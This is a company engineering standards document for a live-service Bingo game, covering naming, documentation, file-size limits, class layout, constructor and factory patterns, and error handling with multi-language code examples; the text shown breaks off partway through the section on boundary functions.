# ESTD1 - Common Engineering Standards and Best Practices for All Engineers

**ESTD1 — Common Engineering Standards and Best Practices**

| Field | Value |
|:----- |:------|
| Document ID | ESTD1 |
| Version | 5.2 |
| Status | Active |
| Last Updated | 2026-04-30 |
| Applies To | All engineers — client, server, tools, automation |
| Depends On | (none — this is the root standard) |
| Approval | Director of Engineering |

---

> **📋 Living Document Notice** This document is a work in progress and will evolve as our systems, practices, and understanding mature. Feedback, questions, and suggestions are welcome — please submit them via comments on the corresponding Confluence page. However, the standards defined herein **must be strictly followed** in all active work. Any exception requires **explicit written approval** from the Director of Engineering or the appropriate Architect, and must be documented in the PR description, the exception log, or the relevant Confluence page.

---

## How to Use This Document

ESTD1 is the root standard. Every other ESTD document builds on it. All engineers — regardless of discipline — must read, understand, and follow this document before any other. Where a child standard ([ESTD2](./ESTD2_-_General_Client_Engg_Standards.md) – [ESTD13](./ESTD13_-_Jenkins_CI_CD_Standards.md#estd13--jenkins-cicd-standards-for-unity-and-web-tool-builds)) conflicts with this document, the child standard takes precedence only in the narrow area it addresses; in all other areas [ESTD1](./ESTD1_-_Common_Engg_Standards_And_Best_Practices.md) applies.

Exceptions to any rule require written approval from the Director of Engineering or a designated Architect. Approval must be recorded in the PR description, the relevant Confluence page, or the team's exception log.

---

## Table of Contents

- [ESTD1 - Common Engineering Standards and Best Practices for All Engineers](#estd1---common-engineering-standards-and-best-practices-for-all-engineers)
  - [How to Use This Document](#how-to-use-this-document)
  - [Table of Contents](#table-of-contents)
  - [1. Purpose and Scope](#1-purpose-and-scope)
  - [2. Guiding Principles](#2-guiding-principles)
  - [3. Philosophy](#3-philosophy)
    - [3.1 Every Line of Code Is a Liability](#31-every-line-of-code-is-a-liability)
    - [3.2 There Are No Perfect Solutions, Only Trade-offs](#32-there-are-no-perfect-solutions-only-trade-offs)
  - [4. Naming Conventions](#4-naming-conventions)
    - [4.1 Domain Glossary](#41-domain-glossary)
  - [5. Code Documentation](#5-code-documentation)
    - [5.1 What Must Be Documented](#51-what-must-be-documented)
    - [5.2 Format](#52-format)
    - [5.3 What Documentation Must NOT Be](#53-what-documentation-must-not-be)
    - [5.4 TODO / FIXME / HACK Conventions](#54-todo--fixme--hack-conventions)
  - [6. File and Class Size Constraints](#6-file-and-class-size-constraints)
    - [6.1 Maximum File Length](#61-maximum-file-length)
    - [6.2 What to Do When Approaching the Limit](#62-what-to-do-when-approaching-the-limit)
    - [6.3 Methods](#63-methods)
    - [6.4 Exceptions](#64-exceptions)
  - [7. Class Organization](#7-class-organization)
  - [8. Object Instantiation & Initialization Standard](#8-object-instantiation--initialization-standard)
    - [8.1 The Constructor's Contract](#81-the-constructors-contract)
    - [8.2 Why Constructors Must Not Throw Exceptions](#82-why-constructors-must-not-throw-exceptions)
    - [8.3 The Standard Contracts](#83-the-standard-contracts)
    - [8.4 The Right Pattern: Factory Methods](#84-the-right-pattern-factory-methods)
    - [8.5 The Rule of Thumb](#85-the-rule-of-thumb)
  - [9. Error Handling and Try-Catch Usage](#9-error-handling-and-try-catch-usage)
    - [9.1 When to Use Try-Catch](#91-when-to-use-try-catch)
    - [9.2 When NOT to Use Try-Catch](#92-when-not-to-use-try-catch)
    - [9.3 Block Try-Catch: The Anti-Pattern and the Acceptable Exceptions](#93-block-try-catch-the-anti-pattern-and-the-acceptable-exceptions)
    - [9.4 Catch the Most Specific Exception](#94-catch-the-most-specific-exception)
    - [9.5 Crashing Is the Last Resort](#95-crashing-is-the-last-resort)
  - [10. Boundary Functions](#10-boundary-functions)
    - [10.1 What Is a Boundary?](#101-what-is-a-boundary)
    - [10.2 Responsibilities of a Boundary Function](#102-responsibilities-of-a-boundary-function)
    - [10.3 What a Boundary Function Must NOT Do](#103-what-a-boundary-function-must-not-do)
    - [10.4 Boundary Functions by Domain](#104-boundary-functions-by-domain)
    - [10.5 Code Example (Server)](#105-code-example-server)
    - [10.6 Code Example (Unity Client)](#106-code-example-unity-client)
    - [10.7 Code Hygiene Rules for Boundary Functions](#107-code-hygiene-rules-for-boundary-functions)
  - [11. Input Validation and Sanitization](#11-input-validation-and-sanitization)
    - [11.1 Validate at the Boundary](#111-validate-at-the-boundary)
    - [11.2 Validation Rules](#112-validation-rules)
    - [11.3 Input Sanitization](#113-input-sanitization)
    - [11.4 Sanitization vs. Validation — Knowing the Difference](#114-sanitization-vs-validation--knowing-the-difference)
    - [11.5 Rejection Behavior](#115-rejection-behavior)
  - [12. Logging](#12-logging)
    - [12.1 Log Levels](#121-log-levels)
    - [12.2 What Every Log Entry Must Contain](#122-what-every-log-entry-must-contain)
    - [12.3 What Must Never Be Logged](#123-what-must-never-be-logged)
    - [12.4 Log Volume Discipline on Hot Paths](#124-log-volume-discipline-on-hot-paths)
  - [13. Configuration Management](#13-configuration-management)
    - [13.1 No Hardcoded Values](#131-no-hardcoded-values)
    - [13.2 Configuration Hierarchy](#132-configuration-hierarchy)
    - [13.3 What Are Code Defaults?](#133-what-are-code-defaults)
    - [13.4 Feature Flags](#134-feature-flags)
    - [13.5 Content Reset Cadence](#135-content-reset-cadence)
    - [13.6 Feature Flag Lifecycle and Cleanup](#136-feature-flag-lifecycle-and-cleanup)
  - [14. Performance Awareness and KPI Measurement](#14-performance-awareness-and-kpi-measurement)
    - [14.1 Percentile-Based Measurement: p95, p98, p99](#141-percentile-based-measurement-p95-p98-p99)
    - [14.2 Metric Types: Counter, Histogram, and Gauge](#142-metric-types-counter-histogram-and-gauge)
    - [14.3 Performance Targets (Baselines)](#143-performance-targets-baselines)
    - [14.4 Common Performance Pitfalls](#144-common-performance-pitfalls)
  - [15. Stateful vs. Stateless Patterns](#15-stateful-vs-stateless-patterns)
    - [15.1 What is State?](#151-what-is-state)
    - [15.2 Comparison](#152-comparison)
    - [15.3 In Our Bingo Game Context](#153-in-our-bingo-game-context)
    - [15.4 When to Use Which](#154-when-to-use-which)
  - [16. Caching: Concepts, Usage, and Tradeoffs](#16-caching-concepts-usage-and-tradeoffs)
    - [16.1 What Is a Cache?](#161-what-is-a-cache)
    - [16.2 Advantages of Caching](#162-advantages-of-caching)
    - [16.3 Disadvantages and Risks](#163-disadvantages-and-risks)
    - [16.4 When to Use a Cache](#164-when-to-use-a-cache)
    - [16.5 When NOT to Use a Cache](#165-when-not-to-use-a-cache)
    - [16.6 Cache Invalidation and Implementation Patterns](#166-cache-invalidation-and-implementation-patterns)
  - [17. Resilience and Fail-Safe Design](#17-resilience-and-fail-safe-design)
    - [17.1 Retry with Exponential Backoff](#171-retry-with-exponential-backoff)
    - [17.2 Circuit Breakers](#172-circuit-breakers)
    - [17.3 Graceful Degradation](#173-graceful-degradation)
  - [18. Security Baseline](#18-security-baseline)
    - [18.1 Trust Nothing From the Client](#181-trust-nothing-from-the-client)
    - [18.2 Authentication and Authorization](#182-authentication-and-authorization)
    - [18.3 Transport Security](#183-transport-security)
    - [18.4 Dependency Security](#184-dependency-security)
    - [18.5 Code Security](#185-code-security)
  - [19. Secrets Management](#19-secrets-management)
  - [20. Security Vulnerability Awareness by Domain](#20-security-vulnerability-awareness-by-domain)
    - [20.1 Security Rules That Apply Everywhere](#201-security-rules-that-apply-everywhere)
    - [20.2 Domain-Specific Vulnerability Awareness](#202-domain-specific-vulnerability-awareness)
    - [20.3 Security Review Cadence and Minimum Expectations](#203-security-review-cadence-and-minimum-expectations)
  - [21. Version Control and Git Standards](#21-version-control-and-git-standards)
    - [21.1 What Must Never Be Committed](#211-what-must-never-be-committed)
    - [21.2 Commit Message Format](#212-commit-message-format)
  - [22. Branching Strategy (Gitflow)](#22-branching-strategy-gitflow)
  - [23. Dependency (External library) Management](#23-dependency-external-library-management)
  - [24. Testing Requirements](#24-testing-requirements)
    - [24.1 Testing Pyramid](#241-testing-pyramid)
    - [24.2 Unit Testing Is Mandatory](#242-unit-testing-is-mandatory)
    - [24.3 What Must Be Unit Tested](#243-what-must-be-unit-tested)
    - [24.4 Test Naming Convention](#244-test-naming-convention)
    - [24.5 Build Promotion Policy](#245-build-promotion-policy)
  - [25. Changelog Extraction for Production Builds](#25-changelog-extraction-for-production-builds)
    - [25.1 Changelog Format](#251-changelog-format)
    - [25.2 Automating Changelog Generation](#252-automating-changelog-generation)
    - [25.3 Platform-Specific Changelog](#253-platform-specific-changelog)
    - [25.4 Changelog in the Build Pipeline](#254-changelog-in-the-build-pipeline)
  - [26. Generating a Bill of Materials (BOM) for a Project](#26-generating-a-bill-of-materials-bom-for-a-project)
    - [26.1 Why Every Project Needs a BOM](#261-why-every-project-needs-a-bom)
    - [26.2 BOM Generation by Technology Stack](#262-bom-generation-by-technology-stack)
    - [26.3 BOM Validation and Security Scanning](#263-bom-validation-and-security-scanning)
    - [26.4 BOM in the CI/CD Pipeline](#264-bom-in-the-cicd-pipeline)
    - [26.5 BOM Governance Rules](#265-bom-governance-rules)
  - [27. Privacy Compliance (GDPR and CCPA)](#27-privacy-compliance-gdpr-and-ccpa)
  - [28. Code Hygiene](#28-code-hygiene)
    - [28.1 What Is Code Hygiene?](#281-what-is-code-hygiene)
    - [28.2 Hygiene Checkpoints](#282-hygiene-checkpoints)
    - [28.3 The "Leave It Better" Rule](#283-the-leave-it-better-rule)
  - [29. Common Pitfalls to Avoid](#29-common-pitfalls-to-avoid)
  - [30. Enforcement and Exceptions](#30-enforcement-and-exceptions)

---

## 1. Purpose and Scope

This document defines the universal engineering baseline for all software produced by the engineering team. It covers code written for:

- The legacy Bingo game (Unity client, PHP API server, SmartFox live server, tools)  
- The new Bingo game (Unity client, Java microservice API server, SmartFox live server, tools)  
- Internal web tools and dashboards  
- CI/CD pipelines, automation scripts, and infrastructure-as-code

These standards exist to ensure every system we build is consistent, maintainable, secure, resilient, and economical to operate over a multi-year lifespan with a live-service release cadence.

**Our operational context:** Our primary player base is in the United States (US Eastern and Pacific time zones). Our engineering and production support teams operate primarily from India (IST, UTC+5:30). This geographic separation means content resets and production deployments often happen during Indian business hours that align with US off-peak hours (late night US time). Standards are calibrated to this reality.

---

## 2. Guiding Principles

The following principles underpin every rule in every ESTD document. When in doubt about a specific case, reason from these principles.

| # | Principle | Meaning |
|:--|:----------|:--------|
| P1 | Clarity over cleverness | Code is read far more often than it is written. Prefer the obvious solution over the elegant one. |
| P2 | Fail gracefully, never silently | Every error must be handled, logged, and surfaced at the right level. Silent failures are the hardest to debug in a live service.| 
| P3 | Defense in depth | Never trust a single layer of protection. Validate at the boundary, again at the service, and again at the database. |
| P4 | Minimal blast radius | Limit the scope of any change. A bug in feature A must not be able to break feature B. |
| P5 | Crash is the last resort | A crashed component serves nobody. Degrade gracefully; exhaust all safe recovery paths before giving up. |
| P6 | Own your data | Understand the lifecycle, storage location, and access controls for every piece of data you produce. |
| P7 | Leave the code better than you found it | Every PR is an opportunity to improve readability, reduce duplication, or add a missing test. |
| P8 | Explicit is better than implicit | Avoid magic values, hidden state, and implicit behavior. Prefer enums over raw integers, named constants over literals. |

---

## 3. Philosophy

### 3.1 Every Line of Code Is a Liability

*"Every line of code you write is a line someone has to read, a line that can contain a bug, a line that must be maintained when requirements change, and a line that must be tested. The best code is the code you don't have to write."*

This philosophy is not about writing less code at the expense of functionality. It is about being intentional. Before writing any code, ask:

1. **Does this need to exist?** Can an existing library, utility, or pattern solve this? Reinventing something that already works adds maintenance cost with no benefit.  
2. **Is this the simplest solution?** Complex code is not a sign of skill — simple, readable code that solves the problem well is. A new engineer joining the team in six months is your most important reader.  
3. **What will happen to this in a year?** Weekly content resets, monthly feature releases, and a 15-year-old live service mean your code will be read and modified far more times than it was written.

**In day-to-day practice, this philosophy manifests as:**
- **Deleting code is as important as writing it.** When you refactor, remove dead code paths, obsolete flags, and old migration helpers. A smaller codebase is a healthier one.  
- **Resist gold-plating.** Build what is needed now. Extensibility that is never used is unused code — and unused code still needs to be read and understood.  
- **Du**plicate code is a debt multiplier.** If the same logic exists in three places, every bug fix and every requirement change costs three times as much. Extract and share.  
- **Named constants, not magic literals.** A literal `75` in a Bingo game might mean the maximum ball number, a room capacity limit, or a configuration value. `BINGO_BALL_NUMBER_MAX = 75` eliminates ambiguity forever.  
- **Small functions.** A function that does one thing has one reason to change, one reason to fail, and is easy to test. A function that does five things is five liabilities bundled together.

```c#
// A liability — what does 75 mean here? What does 30 mean?
if (ballNumber > 75 || players.Count > 30) return;

// Reduced liability — the meaning is explicit, the constants are testable
if (ballNumber > BINGO_BALL_NUMBER_MAX || players.Count > ROOM_PLAYER_CAPACITY) return;
```

### 3.2 There Are No Perfect Solutions, Only Trade-offs

Every technical decision is made inside a web of constraints: team size, skill level, timeline, budget, existing codebase, expected load, and rate of change. Change any one of those constraints and the best decision may change with it. The solution did not get worse — the context changed.

This is why blindly copying others is dangerous. Engineers read that Netflix uses microservices and conclude that microservices are the right choice. But Netflix's context — thousands of engineers, massive scale, billions in infrastructure budget — is nothing like a mid-sized game studio with 25 engineers. Copying a solution without sharing the context that produced it adds complexity with none of the benefits.

**When you choose one approach over another, you are not eliminating problems — you are choosing which problems you are willing to live with.** A highly optimised system is often hard to read and maintain. A flexible, configurable system is harder to understand than a simple, purpose-built one. Every piece of technical debt is a conscious trade-off: move faster now, pay the cost later. The mistake is not making the trade-off — it is not acknowledging it.

Context is not just technical. A solution is only as good as the team's ability to build and maintain it. A 15-year-old live-service game needs stability above almost everything else; an early-stage product needs the ability to change direction cheaply. The same engineering approach applied to both would be wrong for at least one of them.

This way of thinking demands two things from engineers. First, honesty about costs — every solution has them, and a proposal that does not name them is salesmanship, not engineering. Second, resistance to dogma — principles and patterns are tools, and the most dangerous engineers are those who have found one they believe in unconditionally and apply it everywhere.

Good engineering judgment is the ability to read a situation clearly and match a solution to it honestly, rather than reaching for whatever is fashionable, familiar, or theoretically elegant.

---

## 4. Naming Conventions

Names are the most-read form of documentation. A well-named variable makes the surrounding code understandable without comments. A poorly named variable forces the reader to trace the value through the entire function to understand what it represents. In a codebase maintained by multiple teams over many years, naming is a force multiplier.

The exact casing rules are defined per language in the child standards. The following naming semantics apply universally:

| Category | Rule |
|:---------|:-----|
| Names must be pronounceable | `usrCnt` → `userCount`. Abbreviations are acceptable only if universally understood in context (e.g., `id`, `url`, `api`). |
| Boolean variables/properties | Must read as a true/false statement: `isConnected`, `hasReward`, `canAttack`. Never `connectionFlag` or `status`. |
| Collections | Must be plural: `players`, `ballNumbers`, `roomIds`. |
| Constants / magic values | Must be named constants. No raw magic numbers or strings in logic code: `RECONNECT_ATTEMPT_COUNT_MAX = 5`, not `5`. |
| Private / internal members | Must be visually distinguishable from public members per the language standard (e.g., prefix `_` in C# and PHP). |
| Temporal variables | Suffix with unit: `timeoutMs`, `cooldownSec`, `expiryTimestampUtc`. |
| Acronyms in names | Treat as a word; do not uppercase the entire acronym unless it is a constant. `playerId`, `apiUrl`, `HttpClient` — not `playerID`, `APIurl`, `HTTPClient`. |

**Note:** For the exact naming strategy follow the guidelines described in [ESTD14](./ESTD14_-_Hierarchical_Naming_Strategy_for_Programming_Entities.md#estd14---hierarchical-naming-strategy-for-programming-entities)

### 4.1 Domain Glossary

The following terms have a single, agreed-upon definition across all codebases. Every engineer must use these terms consistently.

| Term | Definition |
|:-----|:-----------|
| `player` | A human user of the game (not a bot or AI) |
| `round` | A Bingo game session participated by at least one human player |
| `room` | A virtual space where live Bingo game rounds are hosted and are coordinated by SmartFox |
| `card` | A single Bingo card belonging to a player |
| `daub` | The act of marking a called number on a card |
| `pattern` | A winning arrangement of daubed numbers on a card |
| `bonus` | Any awarded in-game currency or prize |
| `feature_flag` | A server-side toggle controlling feature visibility |
| `content_reset` | A periodic content refresh cycle (see [§13](#13-configuration-management)) |
| `session` | An authenticated user session (auth token + TTL) |

Any new domain concept must be added to this glossary before being used in code.

---

## 5. Code Documentation

Documentation is not bureaucracy — it is communication with future maintainers, including yourself six months from now. In a live-service game that has been running for 15+ years, the original author of a piece of code may no longer be on the team. Good documentation preserves the "why" that survives beyond the original context.

### 5.1 What Must Be Documented

| What | Requirement |
|:-----|:------------|
| Every interface method | Full doc-comment: purpose, every parameter, return value, every exception/error that can be thrown. |
| Every public method | Full doc-comment as above. |
| Every public property or field | A one-line summary of its purpose and any constraints. |
| Every class | A doc-comment explaining its responsibility and any lifecycle requirements. |
| Non-obvious private methods | At minimum a one-line summary. If the logic is complex, explain the *why*, not just the *what*. |
| Magic values that cannot be extracted | Inline comment explaining the origin and meaning. |

### 5.2 Format

Use the native doc-comment format of each language: `///` XML doc comments in C#, `/** */` PHPDoc in PHP, `/** */` Javadoc in Java, `/** */` JSDoc in TypeScript/JavaScript.

### 5.3 What Documentation Must NOT Be

- A restatement of the code: // increments i by 1 above i++ adds no value.  
- Outdated. Stale documentation is worse than no documentation. Updating the implementation requires updating the doc-comment in the same commit.  
- A substitute for readable code. If you need a paragraph to explain a three-line method, simplify the code first.

### 5.4 TODO / FIXME / HACK Conventions

All must include: the type, your initials, ticket number, and a one-line description.

```
// TODO [JS][BNG-2201]: Replace with event-driven approach once messaging refactor is complete
// FIXME [RS][BNG-1987]: Race condition possible when player disconnects mid-daub — tracking
// HACK [JS][BNG-1100]: SmartFox doesn't support X natively; remove when upgrading to SFS 2.18+
```

**A TODO without a ticket number is not actionable and will be rejected at review.**

---

## 6. File and Class Size Constraints

Files longer than **250** executable lines reliably indicate that a class is doing more than one thing. Large files are harder to review, harder to test, harder to understand, and harder to change safely. Breaking them apart early prevents the accumulation of complexity that makes codebases eventually unmaintainable.

### 6.1 Maximum File Length

A single source file must not exceed **250 lines of executable code.** Comments, blank lines, and import/using statements do not count toward this limit.

This rule applies to all languages (C#, PHP, Java, JavaScript/TypeScript, Shell).

### 6.2 What to Do When Approaching the Limit

When a file approaches 200 lines of executable code:

1. Stop and evaluate whether the class has a single, well-defined responsibility.  
2. Extract a cohesive sub-concern into a new class or helper.  
3. Favour composition over inheritance when restructuring.

### 6.3 Methods

- Maximum 40 lines of executable code per method.  
- Maximum 4 levels of nesting (including loops and conditionals). If you need deeper nesting, extract inner blocks into private methods.  
- A method should do one thing. If its name requires the word "and" or "or", split it.

### 6.4 Exceptions

Files generated by tooling (e.g., protobuf output, auto-generated ORM models, Swagger stubs) are exempt from the 250-line limit but must be clearly marked:

```java
// AUTO-GENERATED FILE — DO NOT EDIT MANUALLY
// Source: reward-service/src/main/proto/reward.proto
// Generated: 2026-03-01
```

---

## 7. Class Organization

The template

```
class ClassName
{
    // -----------------------------------------------------------------
    // 1. Constants
    // -----------------------------------------------------------------
    public constants
    protected/internal constants
    private constants

    // -----------------------------------------------------------------
    // 2. Static state
    // -----------------------------------------------------------------
    public static readonly members
    protected/internal static members
    private static members

    // -----------------------------------------------------------------
    // 3. Instance state
    // -----------------------------------------------------------------
    private instance fields
    protected/internal instance fields

    // -----------------------------------------------------------------
    // 4. Properties / accessors
    // -----------------------------------------------------------------
    public properties
    protected/internal properties
    private properties

    // -----------------------------------------------------------------
    // 5. Construction
    // -----------------------------------------------------------------
    public constructors / factory methods
    protected/internal constructors
    private constructors

    // -----------------------------------------------------------------
    // 6. Public API
    // -----------------------------------------------------------------
    public methods

    // -----------------------------------------------------------------
    // 7. Subclass extension points
    // -----------------------------------------------------------------
    protected abstract methods
    protected virtual/overridable methods
    protected helper methods intended for inheritors

    // -----------------------------------------------------------------
    // 8. Internal collaboration surface
    // -----------------------------------------------------------------
    internal/package-private methods
    internal/package-private properties

    // -----------------------------------------------------------------
    // 9. Implementation details
    // -----------------------------------------------------------------
    private methods
    private validation helpers
    private computation helpers
    private state mutation helpers
    private formatting/mapping helpers

    // -----------------------------------------------------------------
    // 10. Nested types
    // -----------------------------------------------------------------
    internal/private enums
    internal/private nested classes/interfaces/types
}
```
This template makes classes predictable to read and maintain. It puts stable class-level information first, construction next, the public contract before implementation details, and subclass extension points clearly separate from private internals. That reduces scanning cost, makes intent easier to understand, and helps engineers find the right place for new code without guesswork. It also improves consistency across the codebase, which lowers review friction, speeds onboarding, and makes large classes easier to refactor safely.

---

## 8. Object Instantiation & Initialization Standard

### 8.1 The Constructor's Contract

A constructor has one job: bring an object into a valid, usable state. It is not a place for business logic, network calls, file I/O, or anything that can fail unpredictably. Callers trust that invoking new will always produce a ready object — breaking this trust makes code fragile and reasoning about failures unnecessarily complex.

### 8.2 Why Constructors Must Not Throw Exceptions

When a constructor throws exceptions, the object exists in a **partially constructed, undefined state**. The caller receives neither a usable object nor a clean failure — they receive ambiguity. This violates the foundational contract:

> *"If construction completes, the object is valid. If it does not complete, no object exists."*

Practically, partial construction causes:

- **Resource leaks** — locks, file handles, or connections acquired mid-constructor may never be released.
- **Unpredictable state** — destructors or finalizers may run on incomplete objects.
- **Obscured intent** — errors thrown from new blur the line between construction failure and business logic failure.

### 8.3 The Standard Contracts

| Contract | Expectation |
|:---------|:------------|
| **Validity** | After construction, the object must be in a fully valid, usable state |
| **Predictability** | Construction must always succeed if arguments are valid |
| **Minimalism** | Constructors only assign values and set defaults — nothing more |
| **Argument validation** | Validate *types* and *nulls* only; never perform domain or business validation |
| **No side effects** | No network calls, no file I/O, no database queries, no event emission |

### 8.4 The Right Pattern: Factory Methods

The constructor should remain simple. If that's not possible then move fallible initialization out of the constructor and into a **factory method**. The constructor remains safe; the factory owns the risk.

**PHP — API Server**

```php
class PlayerSession {
    private string $playerId;
    private string $token;

    // Constructor: safe, always succeeds
    private function __construct(string $playerId, string $token) {
        $this->playerId = $playerId;
        $this->token    = $token;
    }

    // Factory: owns the risk of failure
    public static function create(string $playerId): self {
        $token = TokenService::generate($playerId); // can fail — contained here
        return new self($playerId, $token);
    }
}
```

**Java — API Server**

```java
public class GameRoom {
    private final String roomId;
    private final int playerCountMax;

    private GameRoom(String roomId, int playerCountMax) {
        this.roomId        = roomId;
        this.playerCountMax = playerCountMax;
    }

    public static GameRoom create(String roomId, int playerCountMax) throws RoomException {
        if (playerCountMax < 1) throw new RoomException("playerCountMax must be positive");
        RoomRegistry.register(roomId); // fallible — belongs here, not in constructor
        return new GameRoom(roomId, playerCountMax);
    }
}
```

**Unity C# — Client**

```c#
public class BingoCard {
    public int[] Numbers { get; }

    private BingoCard(int[] numbers) {
        Numbers = numbers; // pure assignment
    }

    public static BingoCard Create(int[] numbers) {
        if (numbers == null || numbers.Length != 25)
            throw new ArgumentException("A Bingo card requires exactly 25 numbers.");
        return new BingoCard(numbers);
    }
}
```

**NextJS — Internal Tools**

```tsx
class ReportConfig {
    private constructor(
        public readonly reportType: string,
        public readonly dateRange: DateRange
    ) {}

    static create(reportType: string, dateRange: DateRange): ReportConfig {
        if (!REPORT_TYPES_VALID.includes(reportType))
            throw new Error(`Unknown report type: ${reportType}`);
        return new ReportConfig(reportType, dateRange);
    }
}
```
---

### 8.5 The Rule of Thumb

> *Constructors initialize. Factories create. If it can fail, it belongs in a factory.*

A well-behaved constructor is boring by design — and that is precisely what makes it reliable.

---

## 9. Error Handling and Try-Catch Usage

Unhandled errors in a live-service game can result in silent data corruption, currency loss, or player-facing crashes that generate support tickets and erode trust. Proper error handling ensures that failures are visible, logged, scoped, and recoverable wherever possible.

### 9.1 When to Use Try-Catch

Use a try-catch block when:

1. **You can meaningfully recover.** You can retry the operation, fall back to a default, or return a structured error response.  
2. **You own the error boundary.** Entry points such as HTTP request handlers, SmartFox extension handlers, message queue consumers, and scheduled job runners should catch all exceptions and convert them to structured responses. At these **entry-point boundaries**, wrapping the entire handler body in a single try block with multiple *typed* catch clauses is the correct pattern (see [§9.3](#93-block-try-catch-the-anti-pattern-and-the-acceptable-exceptions)). This is not a block try-catch anti-pattern.  
3. **You are calling code you don't control.** Third-party libraries, external APIs, and database drivers throw unchecked exceptions that must be wrapped.  
4. **You must guarantee cleanup.** Resource cleanup (database connection release, lock release, file handle close) belongs in a `finally` block, implying a try-catch/try-finally structure.

```java
// GOOD — meaningful recovery at the entry boundary
public Response rewardClaim(Request request) {
    try {
        RewardClaimResult result = rewardService.claim(request.getPlayerId(), request.getRewardId());
        return Response.ok(result);
    } catch (RewardAlreadyClaimedException e) {
        // Expected business condition — return structured error, not a 500
        return Response.conflict("REWARD_ALREADY_CLAIMED", e.getMessage());
    } catch (PlayerNotFoundException e) {
        logger.warn("Player not found during reward claim", Map.of("playerId", request.getPlayerId()));
        return Response.notFound("PLAYER_NOT_FOUND");
    } catch (Exception e) {
        // Final safety net — log everything, return generic 500
        logger.error("Unexpected error during reward claim", e);
        return Response.internalError("INTERNAL_ERROR");
    }
}
```

### 9.2 When NOT to Use Try-Catch

Do not use a try-catch block when:

1. **You cannot do anything meaningful with the exception.** If you catch an exception only to re-throw it, the catch adds nothing. Remove it and let the exception propagate to an owner that can handle it.  
2. **You want to suppress errors silently.** An empty catch block is never acceptable. If you catch an exception and do nothing, you have hidden a bug.  
3. **You want to avoid fixing the real problem.** Wrapping a `NullPointerException` in a try-catch that returns null does not fix the null — it obscures it.  
4. **The exception indicates programmer error.** `NullPointerException`, `ArrayIndexOutOfBoundsException`, `IllegalArgumentException` caused by your own code logic should be fixed at the source, not caught.

```php
// BAD — catching to suppress, hiding a bug
try {
    $reward = $this->rewardRepository->findById($rewardId);
    $this->awardReward($player, $reward);
} catch (\Exception $e) {
    // do nothing — this HIDES the error forever
}

// BAD — catching a base exception without logging or context
try {
    $reward = $this->rewardRepository->findById($rewardId);
} catch (\Exception $e) {
    return null; // What failed? Why? We'll never know.
}

// GOOD — catch specific, log with context, handle deliberately
try {
    $reward = $this->rewardRepository->findById($rewardId);
} catch (DatabaseException $e) {
    $this->logger->error('Failed to load reward for claim', [
        'rewardId' => $rewardId,
        'playerId' => $player->getId(),
        'error'    => $e->getMessage(),
    ]);
    return ClaimResult::failure(ClaimError::RewardLoadFailed);
}
```

### 9.3 Block Try-Catch: The Anti-Pattern and the Acceptable Exceptions

**The anti-pattern:** Wrapping multiple independent operations in a single try-catch block is prohibited (outside of the two exceptions below) because when something goes wrong, you cannot tell which operation failed.

**The two acceptable exceptions to single-statement try-catch:**

- **Entry-point boundary methods** (HTTP handlers, SmartFox extension handlers, job runners, Unity button callbacks): May wrap the entire operation in a single try block with multiple typed catch clauses, each handling one specific exception type.  
- **Transaction wrappers:** A group of statements forming an atomic DB transaction may share a single try-catch-finally whose catch handler rolls back the transaction.

**Outside of these two cases: one failable operation = one try-catch block.**

```c#
// BAD — a block try-catch. Was it LoadInventory, AwardReward, or SaveInventory that failed?
try
{
    var inventory = LoadInventory(playerId);
    var reward    = BuildReward(rewardId);
    AwardReward(playerId, reward);
    SaveInventory(playerId, inventory);
}
catch (Exception ex)
{
    Logger.Error("Something went wrong", ex);
}

// GOOD — each operation individually handled
Inventory inventory;
try
{
    inventory = InventoryLoad(playerId);
}
catch (InventoryLoadException ex)
{
    Logger.Error($"Failed to load inventory for player {playerId}", ex);
    return AwardResult.Failure(AwardFailure.InventoryUnavailable);
}
```

### 9.4 Catch the Most Specific Exception

Always catch the most specific exception type available. Catching the base `Exception` (C#), `\Exception` (PHP), or `Exception` (Java) is permitted only as a final safety net at a top-level boundary. In that case the catch must:

- Log the exception with full context.  
- Return a safe, well-defined fallback or error response.  
- Not re-throw unless the architecture requires it.

### 9.5 Crashing Is the Last Resort

A process crash (unhandled exception, fatal error, Out Of Memory(OOM) kill) must be treated as a last resort. Before allowing a crash, consider whether the operation can be retried with backoff, whether the component can fall back to a degraded but functional state, and whether the request can be rejected cleanly while the rest of the system keeps running.

Crash-worthy conditions are limited to: unrecoverable data corruption that would cause silent data loss if continued; security violations that must not proceed under any circumstance; and startup failures where a required dependency (e.g., database connection) is permanently unavailable.

---

## 10. Boundary Functions

A boundary function is any function that sits at the edge of a trust boundary — the point where data crosses from an untrusted or external domain into a controlled, internal one. Getting boundary functions right is the single most impactful thing you can do for security, data integrity, and debuggability. A flaw at a boundary propagates everywhere downstream; a correct boundary protects everything that follows.

### 10.1 What Is a Boundary?

```
EXTERNAL (untrusted)         TRUST BOUNDARY           INTERNAL (trusted)
───────────────────────────── │ ────────────────────────────────────────────
Player HTTP request           │   Validated, typed, authorized request
SmartFox client message       │   Parsed, sanitized domain event
SQS job message               │   Deserialized, schema-validated job
API response from 3rd party   │   Mapped to internal domain type
Unity UI button tap           │   Rate-limited, deduplicated action
```

A boundary does not make data trusted just because the data reached our process. Data becomes safe to use only after the boundary has verified identity, authorization, shape, range, ownership, freshness, and integrity, then converted the input into explicit internal types. Validation and sanitization rules are defined in [§11. Input Validation and Sanitization](#11-input-validation-and-sanitization). The broader security baseline is defined in [§18. Security Baseline](#18-security-baseline), and domain-specific vulnerability categories are listed in [§20. Security Vulnerability Awareness by Domain](#20-security-vulnerability-awareness-by-domain).

| Term | Meaning |
|:-----|:--------|
| **Untrusted data** | Data from outside the current trust boundary that has not been verified yet: client payloads, URL parameters, queue messages, file uploads, webhook bodies, remote config, or third-party API responses. |
| **Partially trusted data** | Data that passed one check but not all checks needed for the operation. Example: a valid session token identifies a player, but the request body can still contain another player's ID or a forged reward amount. |
| **Trusted source** | A source the system is allowed to rely on for a specific claim after verification. Example: the authenticated session is trusted for player identity; the client body is not. |
| **Trust boundary** | The line where data moves from one trust level to another, such as browser to API, SmartFox client to extension handler, API to database, or CI job to production migration. |
| **Permission boundary** | The maximum set of actions an identity or component is allowed to perform, even if its code is compromised. Examples: a service role, database user, operator role, or CI deployment credential. |
| **Least privilege** | Grant only the permissions required for the specific job, environment, and resource. Do not grant broad access "just in case." |
| **Blast radius** | The maximum damage possible if a component, account, token, or credential is misused or compromised. Smaller permission boundaries reduce blast radius. |

**Risks of working with untrusted or partially trusted data:**

| Risk | Example | Required Control |
|:-----|:--------|:-----------------|
| Spoofed identity | Request body says `playerId=42` while the session belongs to another player | Derive identity from authenticated session only; authorize ownership server-side |
